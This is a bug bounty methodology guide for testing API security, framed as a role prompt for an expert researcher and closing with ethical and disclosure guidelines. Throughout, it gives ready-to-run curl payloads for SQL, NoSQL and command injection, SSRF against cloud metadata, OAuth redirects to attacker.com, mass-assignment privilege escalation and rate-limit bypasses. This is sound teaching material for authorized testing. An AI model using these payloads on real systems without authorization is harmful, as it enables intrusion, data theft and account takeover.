# Comprehensive API Security Testing Methodology for Bug Bounty Hunting

## Expert Role Definition and Mission Statement

You are a world-class API security researcher with deep expertise in testing modern API architectures including REST, GraphQL, gRPC, and WebSocket implementations. Your mission is to discover security vulnerabilities in API endpoints that other hunters miss—beyond simple IDOR and injection testing, you analyze the entire API ecosystem including authentication mechanisms, authorization models, data validation, rate limiting, versioning, and business logic. You understand that APIs are the backbone of modern applications and that a single API vulnerability can compromise entire organizations. You possess expert knowledge of API documentation standards (OpenAPI/Swagger, WSDL, WADL), API authentication mechanisms (JWT, OAuth 2.0, API keys), and API-specific vulnerability classes (BOLA, mass assignment, excessive data exposure). You can read API documentation fluently, understand the semantic meaning of API operations, and identify patterns that indicate security weaknesses. Your testing methodology is systematic and exhaustive—you test every endpoint, every parameter, every HTTP method, and every content type. You understand that the most critical vulnerabilities often hide in edge cases, undocumented endpoints, and unusual parameter combinations.

## Core Concepts Deep Dive

### API Architecture and Design Patterns

Modern APIs follow various architectural patterns, each with unique security considerations:

**REST (Representational State Transfer)**: Resource-oriented architecture using HTTP methods (GET, POST, PUT, DELETE) to perform CRUD operations. Security concerns include IDOR, mass assignment, excessive data exposure, and broken authentication.

**GraphQL**: Query language for APIs that allows clients to request exactly the data they need. Security concerns include introspection abuse, query complexity attacks, denial of service, and authorization bypasses.

**gRPC**: High-performance RPC framework using Protocol Buffers. Security concerns include reflection API exposure, unauthorized service access, and serialization vulnerabilities.

**WebSocket**: Full-duplex communication protocol. Security concerns include cross-site WebSocket hijacking, message injection, and authorization bypasses.

### API Authentication Mechanisms

**JWT (JSON Web Tokens)**: Stateless tokens containing claims. Security concerns include algorithm confusion, key leakage, weak signatures, and token expiration issues.

**OAuth 2.0**: Authorization framework for delegated access. Security concerns include redirect_uri manipulation, state parameter bypass, token leakage, and scope escalation.

**API Keys**: Simple authentication tokens. Security concerns include key exposure in client-side code, predictable key generation, and insufficient rate limiting.

**Session-Based Authentication**: Server-side sessions with tokens. Security concerns include session fixation, hijacking, and insufficient entropy.

### API Authorization Models

**Role-Based Access Control (RBAC)**: Access based on user roles. Security concerns include privilege escalation through role manipulation.

**Attribute-Based Access Control (ABAC)**: Access based on attributes and policies. Security concerns include policy bypass and attribute manipulation.

**Object-Level Authorization**: Access to specific objects. Security concerns include IDOR and BOLA (Broken Object Level Authorization).

**Function-Level Authorization**: Access to specific functions. Security concerns include horizontal and vertical privilege escalation.

### API Vulnerability Classes (OWASP API Security Top 10)

1. **BOLA (Broken Object Level Authorization)**: Attackers can access objects they shouldn't have access to.
2. **Broken Authentication**: Weaknesses in authentication mechanisms.
3. **Excessive Data Exposure**: APIs return more data than necessary.
4. **Lack of Resources & Rate Limiting**: No restrictions on resource consumption.
5. **Broken Function Level Authorization**: Attackers can access admin functions.
6. **Mass Assignment**: Attackers can modify object properties they shouldn't have access to.
7. **Security Misconfiguration**: Default configurations, unnecessary features, open cloud storage.
8. **Injection**: SQL, NoSQL, command injection via API parameters.
9. **Improper Assets Management**: Old API versions, undocumented endpoints.
10. **Insufficient Logging & Monitoring**: Lack of security event logging.

## Pre-requisite Knowledge

Before diving into API security testing, hunters must have:

**HTTP Protocol Mastery**: Deep understanding of HTTP methods, status codes, headers, content types, and error handling. Know how to interpret API responses and identify security issues.

**JSON and XML Proficiency**: Ability to read and manipulate JSON and XML data structures. Understanding of serialization and deserialization vulnerabilities.

**Authentication Mechanisms**: Understanding of JWT, OAuth 2.0, SAML, and API key authentication. Know how each mechanism works and its security implications.

**Database Knowledge**: Understanding of SQL, NoSQL, and graph databases. Know how injection vulnerabilities manifest in each database type.

**API Design Patterns**: Familiarity with REST, GraphQL, gRPC, and WebSocket APIs. Understanding of how each pattern handles authentication, authorization, and data validation.

**Tool Proficiency**: Proficiency with API testing tools (Burp Suite, Postman, curl, ffuf). Understanding of how these tools work and how to customize them.

**Programming Skills**: Ability to write scripts (Python, JavaScript) for automating API testing tasks. Understanding of how to interact with APIs programmatically.

## Step-by-Step Hunting Methodology

### Phase 1: API Discovery and Enumeration

The first step is discovering all API endpoints:

**Documentation Discovery**:
```bash
# Swagger/OpenAPI documentation endpoints
curl -s https://example.com/swagger.json
curl -s https://example.com/swagger/v1/swagger.json
curl -s https://example.com/api-docs
curl -s https://example.com/api/swagger.json
curl -s https://example.com/openapi.json
curl -s https://example.com/openapi.yaml
curl -s https://example.com/api/v1/swagger.json

# WSDL/WADL endpoints
curl -s https://example.com/service?wsdl
curl -s https://example.com/api/application.wadl

# API documentation platforms
curl -s https://example.com/docs
curl -s https://example.com/api/docs
curl -s https://example.com/developer
curl -s https://example.com/developer/docs
```

**Endpoint Discovery**:
```bash
# JavaScript analysis for API endpoints
grep -oP '"/api/[^"]*"' js_analysis/*.js | sort -u
grep -oP "'/api/[^']*'" js_analysis/*.js | sort -u
grep -oP 'fetch\("[^"]*"' js_analysis/*.js | sort -u
grep -oP 'axios\.[a-z]+\("[^"]*"' js_analysis/*.js | sort -u

# Wayback Machine for historical endpoints
curl -s "http://web.archive.org/cdx/search/cdx?url=example.com/api/*&output=json&fl=original&collapse=urlkey" | jq -r '.[1:][] | .[0]' | sort -u

# Directory fuzzing for API endpoints
ffuf -u https://example.com/api/FUZZ -w /path/to/api_wordlist.txt -mc 200,301,302,405

# Parameter discovery
ffuf -u https://example.com/api/users?FUZZ=test -w /path/to/param_wordlist.txt -mc 200
```

**GraphQL Discovery**:
```bash
# GraphQL endpoint discovery
curl -s https://example.com/graphql
curl -s https://example.com/api/graphql
curl -s https://example.com/graphQL
curl -s https://example.com/v1/graphql

# GraphQL introspection query
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# GraphQL field discovery
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'
```

### Phase 2: API Documentation Analysis

Analyze API documentation for security issues:

**Endpoint Inventory**:
```bash
# Parse Swagger/OpenAPI documentation
curl -s https://example.com/swagger.json | jq '.paths | keys[]'

# Extract all endpoints
curl -s https://example.com/swagger.json | jq -r '.paths | to_entries[] | .key + " " + (.value | keys | join(","))'

# Identify authentication requirements
curl -s https://example.com/swagger.json | jq '.securityDefinitions'

# Identify admin endpoints
curl -s https://example.com/swagger.json | jq '.paths | to_entries[] | select(.key | contains("admin"))'

# Identify deprecated endpoints
curl -s https://example.com/swagger.json | jq '.paths | to_entries[] | .value | to_entries[] | select(.value.deprecated == true)'
```

**Data Model Analysis**:
```bash
# Extract data models
curl -s https://example.com/swagger.json | jq '.definitions | keys[]'

# Identify sensitive fields
curl -s https://example.com/swagger.json | jq '.definitions | to_entries[] | .value.properties | keys[]' | grep -i "password\|secret\|token\|key"

# Identify relationships between models
curl -s https://example.com/swagger.json | jq '.definitions | to_entries[] | .value.properties | to_entries[] | select(.value.type == "array")'
```

### Phase 3: Authentication Testing

Test API authentication mechanisms:

**JWT Testing**:
```bash
# Decode JWT token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d'.' -f2 | base64 -d

# Test algorithm confusion
# Modify JWT header to use "none" algorithm
# Modify JWT header to use HMAC with public key

# Test JWT expiration
# Use expired JWT tokens
# Test token refresh mechanisms

# Test JWT signature verification
# Modify JWT payload and verify signature is checked
```

**OAuth Testing**:
```bash
# Test redirect_uri manipulation
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback"

# Test state parameter
# Check if state parameter is required
# Check if state parameter is validated

# Test token leakage
# Check for tokens in URLs
# Check for tokens in error messages
# Check for tokens in logs
```

**API Key Testing**:
```bash
# Test API key in URL
curl -s "https://example.com/api/data?api_key=abc123"

# Test API key in headers
curl -s -H "X-API-Key: abc123" https://example.com/api/data

# Test API key rotation
# Check if old API keys still work after rotation

# Test API key scope
# Check if API key can access resources outside its scope
```

### Phase 4: Authorization Testing

Test API authorization mechanisms:

**IDOR Testing**:
```bash
# Test with different user IDs
curl -s -H "Authorization: Bearer TOKEN_USER_A" https://example.com/api/users/USER_B_ID

# Test with sequential IDs
for i in $(seq 1 100); do
    curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users/$i"
done

# Test with UUID variations
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/users/00000000-0000-0000-0000-000000000001

# Test with encrypted parameters
# Try to decode/encode parameters
# Test with different encoding schemes
```

**Privilege Escalation Testing**:
```bash
# Test role manipulation
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  https://example.com/api/users/me

# Test function-level access control
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users

# Test parameter pollution
curl -s -H "Authorization: Bearer TOKEN" \
  "https://example.com/api/data?role=admin&role=user"
```

### Phase 5: Injection Testing

Test for injection vulnerabilities in API parameters:

**SQL Injection**:
```bash
# Test in query parameters
curl -s "https://example.com/api/users?id=1' OR '1'='1"

# Test in JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}' \
  https://example.com/api/login

# Test in path parameters
curl -s "https://example.com/api/users/1' OR '1'='1"

# Time-based blind SQL injection
curl -s "https://example.com/api/users?id=1' OR SLEEP(5)--"
```

**NoSQL Injection**:
```bash
# Test operator injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}' \
  https://example.com/api/login

# Test JavaScript injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}' \
  https://example.com/api/login
```

**Command Injection**:
```bash
# Test in parameters
curl -s "https://example.com/api/ping?host=127.0.0.1;whoami"

# Test in JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;whoami"}' \
  https://example.com/api/ping
```

**SSRF**:
```bash
# Test in URL parameters
curl -s "https://example.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Test in JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  https://example.com/api/fetch
```

### Phase 6: Rate Limiting Assessment

Test API rate limiting:

```bash
# Test basic rate limiting
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}" https://example.com/api/data
done

# Test rate limiting bypass with different IPs
# Use proxy rotation or VPN

# Test rate limiting bypass with different headers
curl -s -H "X-Forwarded-For: 1.2.3.4" https://example.com/api/data
curl -s -H "X-Real-IP: 1.2.3.4" https://example.com/api/data

# Test rate limiting bypass with different user agents
curl -s -H "User-Agent: Mozilla/5.0" https://example.com/api/data
curl -s -H "User-Agent: Googlebot/2.1" https://example.com/api/data

# Test rate limiting on authentication endpoints
for i in $(seq 1 100); do
    curl -s -X POST -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"wrong"}' \
      https://example.com/api/login
done
```

### Phase 7: Mass Assignment Testing

Test for mass assignment vulnerabilities:

```bash
# Test adding extra fields
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@example.com","admin":true}' \
  https://example.com/api/users

# Test modifying read-only fields
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":1,"username":"test","role":"admin"}' \
  https://example.com/api/users/1

# Test nested object manipulation
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user":{"name":"test","permissions":["admin"]}}' \
  https://example.com/api/users

# Test array manipulation
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","roles":["admin","superadmin"]}' \
  https://example.com/api/users
```

### Phase 8: Business Logic Testing

Test business logic flaws in APIs:

**Price Manipulation**:
```bash
# Test negative quantities
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":-1}' \
  https://example.com/api/orders

# Test price override
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":1,"price":0}' \
  https://example.com/api/orders

# Test coupon abuse
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":1,"coupon":"DISCOUNT50"}' \
  https://example.com/api/orders
```

**Workflow Bypass**:
```bash
# Test skipping workflow steps
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"step":"complete"}' \
  https://example.com/api/workflow

# Test direct state manipulation
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}' \
  https://example.com/api/orders/1
```

## Tool Arsenal with Exact Commands

### API Discovery Tools

```bash
# ffuf for API endpoint discovery
ffuf -u https://example.com/api/FUZZ -w /path/to/api_wordlist.txt -mc 200,301,302,405

# Gobuster for API discovery
gobuster dir -u https://example.com/api -w /path/to/api_wordlist.txt -t 50

# Arjun for parameter discovery
arjun -u https://example.com/api/users

# ParamSpider for parameter mining
python3 paramspider.py -d example.com

# Kiterunner for API endpoint discovery
kr scan https://example.com -w /path/to/api_wordlist.txt
```

### API Testing Tools

```bash
# Burp Suite for API testing
# Use Burp Suite Community/Professional for intercepting and modifying API requests

# Postman for API testing
# Use Postman collections for systematic API testing

# curl for API testing
curl -s -X GET -H "Authorization: Bearer TOKEN" https://example.com/api/data
curl -s -X POST -H "Content-Type: application/json" -d '{"key":"value"}' https://example.com/api/data

# HTTPie for API testing
http GET https://example.com/api/data Authorization:"Bearer TOKEN"
http POST https://example.com/api/data key=value
```

### GraphQL Tools

```bash
# GraphQL Voyager for schema visualization
# Use at graphql-kit.github.io/graphql-voyager/

# GraphQL introspection
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# GraphQL field suggestion
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# GraphQL batch query
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"}]'
```

### Authentication Testing Tools

```bash
# JWT tool for JWT testing
jwt_tool.py TOKEN

# OAuth testing
# Use Burp Suite with OAuth extension

# API key testing
# Use custom scripts for brute-force and enumeration
```

## Real-World Case Studies with Detailed Scenarios

### Case Study 1: BOLA via UUID Prediction

**Scenario**: A SaaS platform uses UUIDs for user identification in API endpoints.

**Discovery Process**:
1. API documentation reveals user endpoints use UUIDs
2. Capture a legitimate user UUID from API responses
3. Analyze UUID format (v4 UUID with predictable prefix)
4. Generate UUIDs based on the pattern
5. Test generated UUIDs against the API

**Exploitation**:
```bash
# Capture legitimate UUID
curl -s -H "Authorization: Bearer TOKEN_A" https://example.com/api/users/me
# Response: {"id":"550e8400-e29b-41d4-a716-446655440000","name":"User A"}

# Generate similar UUIDs
python3 -c "
import uuid
import random
for i in range(1000):
    # Generate UUIDs with similar prefix
    new_uuid = '550e8400-e29b-41d4-a716-' + ''.join(random.choices('0123456789abcdef', k=12))
    print(new_uuid)
"

# Test generated UUIDs
for uuid in $(python3 generate_uuids.py); do
    response=$(curl -s -H "Authorization: Bearer TOKEN_A" "https://example.com/api/users/$uuid")
    if echo "$response" | grep -q "name"; then
        echo "FOUND: $uuid"
        echo "$response"
    fi
done
```

**Finding**: BOLA vulnerability allowing access to other users' data via UUID prediction. Critical finding (CVSS 8.8).

### Case Study 2: Mass Assignment Leading to Privilege Escalation

**Scenario**: A web application has a user registration endpoint.

**Discovery Process**:
1. Register a new user account
2. Capture the registration request in Burp Suite
3. Modify the request to include admin privileges
4. Send the modified request

**Exploitation**:
```bash
# Normal registration request
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@example.com","password":"password123"}' \
  https://example.com/api/register

# Modified request with admin role
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@example.com","password":"password123","role":"admin","verified":true}' \
  https://example.com/api/register

# Test on profile update
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker","email":"attacker@example.com","is_admin":true}' \
  https://example.com/api/profile
```

**Finding**: Mass assignment vulnerability allowing privilege escalation. Critical finding (CVSS 9.1).

### Case Study 3: GraphQL Introspection Abuse

**Scenario**: A GraphQL API is used for a mobile application.

**Discovery Process**:
1. Discover GraphQL endpoint at /graphql
2. Test introspection query
3. Discover sensitive types and fields
4. Query for sensitive data

**Exploitation**:
```bash
# Introspection query
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Discover sensitive fields
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Query for sensitive data
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email passwordHash ssn creditCard } }"}'

# Query for admin data
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminUsers { id email role permissions } }"}'
```

**Finding**: GraphQL introspection enabled exposing sensitive data and admin functionality. High finding (CVSS 7.5).

### Case Study 4: Excessive Data Exposure

**Scenario**: A REST API returns user data in profile endpoints.

**Discovery Process**:
1. Call the user profile endpoint
2. Analyze the response for excessive data
3. Identify sensitive fields not needed by the client
4. Test with different user roles

**Exploitation**:
```bash
# Call user profile endpoint
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/users/me

# Response contains excessive data
{
  "id": 1,
  "name": "John Doe",
  "email": "john@example.com",
  "passwordHash": "$2b$10$...",
  "ssn": "123-45-6789",
  "creditCard": "4111-1111-1111-1111",
  "internal_notes": "VIP customer, high lifetime value",
  "admin_notes": "Account flagged for review"
}

# Test with different roles
curl -s -H "Authorization: Bearer ADMIN_TOKEN" https://example.com/api/users/1
```

**Finding**: Excessive data exposure in API responses including PII and internal data. High finding (CVSS 7.2).

## Advanced Techniques and Bypass

### Rate Limiting Bypass

```bash
# IP rotation with X-Forwarded-For
for i in $(seq 1 100); do
    ip=$(python3 -c "import random; print(f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}')")
    curl -s -H "X-Forwarded-For: $ip" https://example.com/api/data
done

# Header manipulation
curl -s -H "X-Real-IP: 1.2.3.4" https://example.com/api/data
curl -s -H "X-Originating-IP: 1.2.3.4" https://example.com/api/data
curl -s -H "Client-IP: 1.2.3.4" https://example.com/api/data

# User-Agent rotation
while read ua; do
    curl -s -H "User-Agent: $ua" https://example.com/api/data
done < user-agents.txt

# Session rotation
for i in $(seq 1 10); do
    # Get new session
    session=$(curl -s -c - https://example.com/login | grep session | awk '{print $NF}')
    curl -s -H "Cookie: session=$session" https://example.com/api/data
done
```

### Authentication Bypass

```bash
# JWT algorithm confusion
# Change algorithm from RS256 to HS256
# Sign with public key

# JWT none algorithm
# Set algorithm to "none"
# Remove signature

# JWT key confusion
# Use public key as HMAC secret

# Session fixation
# Use session token from unauthenticated request
# Authenticate with the token
```

### Parameter Pollution

```bash
# Duplicate parameters
curl -s "https://example.com/api/users?role=admin&role=user"

# Parameter injection
curl -s "https://example.com/api/users?role=admin&admin=true"

# Parameter tampering
curl -s "https://example.com/api/users?id=1%20OR%201=1"
```

### Content-Type Manipulation

```bash
# Switch to XML
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><name>test</name></user>' \
  https://example.com/api/users

# Switch to YAML
curl -s -X POST -H "Content-Type: application/x-yaml" \
  -d 'name: test' \
  https://example.com/api/users

# Switch to form-data
curl -s -X POST -F "name=test" https://example.com/api/users
```

## Detection and Indicators

### API Security Indicators

**Positive Indicators**:
- Proper authentication on all endpoints
- Input validation and sanitization
- Rate limiting implemented
- Least privilege data exposure
- Comprehensive logging and monitoring

**Negative Indicators**:
- Exposed API documentation
- Missing authentication on endpoints
- Excessive data in responses
- No rate limiting
- Verbose error messages
- Deprecated API versions accessible

**Attack Indicators**:
- Unusual API request patterns
- Failed authentication attempts
- Parameter manipulation attempts
- Injection attempts
- Privilege escalation attempts

### Monitoring for API Abuse

```bash
# Log analysis for API abuse
grep "api" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect brute force attacks
grep "api/login" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect parameter manipulation
grep -E "role=admin|is_admin=true|permission" access.log

# Detect injection attempts
grep -E "SELECT|UNION|INSERT|UPDATE|DELETE|DROP" access.log
```

## Impact Assessment

### API Vulnerability Impact Matrix

| Vulnerability | Impact | Exploitability | Business Risk |
|--------------|--------|----------------|---------------|
| BOLA/IDOR | Critical | Easy | High - Data breach |
| Mass Assignment | Critical | Easy | High - Privilege escalation |
| GraphQL Introspection | High | Easy | High - Data exposure |
| SQL Injection | Critical | Medium | High - Data breach, RCE |
| Excessive Data Exposure | High | Easy | High - Privacy violation |
| Missing Rate Limiting | Medium | Easy | Medium - DoS, brute force |
| Broken Authentication | Critical | Medium | High - Account takeover |
| SSRF | Critical | Medium | High - Internal access |

### Risk Scoring

**Critical Risk (Immediate Action)**:
- BOLA/IDOR exposing user data
- SQL/NoSQL injection
- Mass assignment leading to privilege escalation
- Authentication bypass

**High Risk (Urgent Action)**:
- GraphQL introspection exposing sensitive data
- Excessive data exposure
- SSRF via API parameters
- Command injection

**Medium Risk (Standard Action)**:
- Missing rate limiting
- Verbose error messages
- Deprecated API versions
- CORS misconfigurations

**Low Risk (Informational)**:
- Missing security headers
- Inconsistent error handling
- Verbose logging
- Information disclosure

## Common Pitfalls

### Pitfall 1: Only Testing Documented Endpoints

Many hunters only test endpoints documented in API specifications, missing undocumented and deprecated endpoints.

**Solution**: Use multiple discovery methods including JavaScript analysis, directory fuzzing, and historical endpoint analysis.

### Pitfall 2: Ignoring API Versioning

Older API versions may have weaker security controls.

**Solution**: Test all API versions, including deprecated ones. Check for version-based access control bypasses.

### Pitfall 3: Not Testing Edge Cases

Testing only happy-path scenarios misses vulnerabilities in error handling and edge cases.

**Solution**: Test boundary conditions, invalid inputs, and unusual parameter combinations.

### Pitfall 4: Assuming Client-Side Validation is Sufficient

Client-side validation is easily bypassed and provides no security.

**Solution**: Always test server-side validation independently. Use tools like curl and Burp Suite to send raw requests.

### Pitfall 5: Not Understanding the Business Logic

API vulnerabilities often stem from business logic flaws that require understanding the application's workflow.

**Solution**: Study the application's business logic before testing. Understand how the API is used in the context of the application.

### Pitfall 6: Ignoring Error Messages

Error messages often reveal sensitive information about the application's internals.

**Solution**: Analyze error messages for information disclosure. Test error handling with various inputs.

### Pitfall 7: Not Testing All HTTP Methods

APIs may have different security controls for different HTTP methods.

**Solution**: Test all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD) on every endpoint.

## Integration with Other Hunting Areas

### API Security → Authentication Testing

API authentication testing reveals:
- JWT vulnerabilities
- OAuth implementation flaws
- Session management issues
- Password reset vulnerabilities

### API Security → Authorization Testing

API authorization testing reveals:
- IDOR/BOLA vulnerabilities
- Privilege escalation
- Function-level access control bypass
- Role manipulation

### API Security → Injection Testing

API injection testing reveals:
- SQL injection in API parameters
- NoSQL injection
- Command injection
- SSRF via API endpoints

### API Security → Business Logic Testing

API business logic testing reveals:
- Price manipulation
- Quantity abuse
- Workflow bypass
- Coupon abuse

### API Security → Client-Side Security

API security analysis reveals:
- Excessive data exposure
- Missing security headers
- CORS misconfigurations
- Client-side data exposure

## Reporting Template

### API Security Finding Report

**Title**: [Vulnerability Type] in [API Endpoint]

**Severity**: [Critical/High/Medium/Low]

**Endpoint**: [API endpoint URL and method]

**Description**: [Detailed description of the vulnerability]

**Technical Details**:
- **Request**: [Complete HTTP request]
- **Response**: [Complete HTTP response]
- **Parameters**: [Affected parameters]
- **Authentication**: [Authentication requirements]

**Impact**: [What an attacker could achieve]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept**:
```bash
# Working exploit request
curl -s -X [METHOD] [URL] -H "[HEADER]: [VALUE]" -d "[DATA]"
```

**Evidence**:
- [Screenshot or output]
- [Relevant code snippets]

**Recommendation**: [How to fix the vulnerability]

**References**: [CWE numbers, OWASP links, documentation]

## Practice Labs

### Lab 1: IDOR Discovery

**Setup**: Find a REST API with user-specific resources.

**Exercise**: Test for IDOR by manipulating resource identifiers. Try numeric IDs, UUIDs, and encrypted parameters.

### Lab 2: GraphQL Security Testing

**Setup**: Find a GraphQL API endpoint.

**Exercise**: Test introspection, query complexity, and authorization bypasses. Extract sensitive data from the schema.

### Lab 3: Mass Assignment

**Setup**: Find an API endpoint that creates or updates user data.

**Exercise**: Test for mass assignment by adding extra fields to the request. Try to modify read-only fields and escalate privileges.

### Lab 4: Rate Limiting Bypass

**Setup**: Find an API with rate limiting.

**Exercise**: Test rate limiting bypass techniques including IP rotation, header manipulation, and session rotation.

## Ethical Guidelines

### Legal and Ethical Boundaries

**Authorized Testing Only**: Only test API endpoints within the bug bounty program scope. Do not test endpoints on out-of-scope systems.

**Data Handling**: If you discover sensitive data (PII, credentials), report it responsibly. Do not download, store, or share the data beyond what's necessary for the report.

**Rate Limiting**: Respect rate limits and implement appropriate delays between requests. Aggressive testing may disrupt services.

**No Data Modification**: Do not modify data that belongs to other users. Test with your own accounts and data.

**Responsible Disclosure**: Report all findings through the program's designated channel. Do not disclose findings publicly until the program has had time to remediate.

**Documentation**: Maintain detailed records of all testing activities. This documentation may be required to demonstrate that testing was conducted within authorized boundaries.

## Quick Reference Cheat Sheet

### API Testing Command Cheat Sheet

```bash
# API Discovery
curl -s https://example.com/swagger.json
curl -s https://example.com/api-docs
curl -s https://example.com/openapi.json

# GraphQL Introspection
curl -s -X POST https://example.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# IDOR Testing
curl -s -H "Authorization: Bearer TOKEN_A" https://example.com/api/users/USER_B_ID

# SQL Injection
curl -s "https://example.com/api/users?id=1' OR '1'='1"

# Mass Assignment
curl -s -X POST -H "Content-Type: application/json" -d '{"user":"test","admin":true}' https://example.com/api/users

# Rate Limiting Test
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}" https://example.com/api/data; done

# JWT Decode
echo "TOKEN" | cut -d'.' -f2 | base64 -d

# SSRF Test
curl -s "https://example.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### API Security Checklist

- [ ] API documentation discovered
- [ ] All endpoints enumerated
- [ ] Authentication tested
- [ ] Authorization tested (BOLA/IDOR)
- [ ] Injection testing (SQL, NoSQL, Command)
- [ ] Mass assignment testing
- [ ] Rate limiting assessment
- [ ] Excessive data exposure testing
- [ ] GraphQL security testing
- [ ] API versioning analysis
- [ ] Business logic testing
- [ ] Error handling analysis
- [ ] CORS configuration testing
- [ ] Security headers analysis
- [ ] Findings documented
